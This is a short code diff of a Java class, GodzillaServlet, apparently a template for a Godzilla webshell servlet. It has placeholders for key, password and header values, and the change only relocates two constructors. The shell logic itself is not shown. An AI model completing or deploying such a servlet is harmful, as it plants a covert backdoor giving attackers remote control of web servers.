@@ -14,12 +14,18 @@ import java.io.IOException;
  * @since 2024/12/15
  */
 public class GodzillaServlet extends ClassLoader implements Servlet {
-
     public String key = "{{key}}";
     public String pass = "{{pass}}";
     public String md5 = "{{md5}}";
     public String headerName = "{{headerName}}";
     public String headerValue = "{{headerValue}}";
+
+    public GodzillaServlet() {
+    }
+
+    public GodzillaServlet(ClassLoader parent) {
+        super(parent);
+    }
 
     @Override
     public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
@@ -63,13 +69,6 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
     @Override
     public void destroy() {
 
-    }
-
-    public GodzillaServlet() {
-    }
-
-    public GodzillaServlet(ClassLoader parent) {
-        super(parent);
     }
 
     @SuppressWarnings("all")
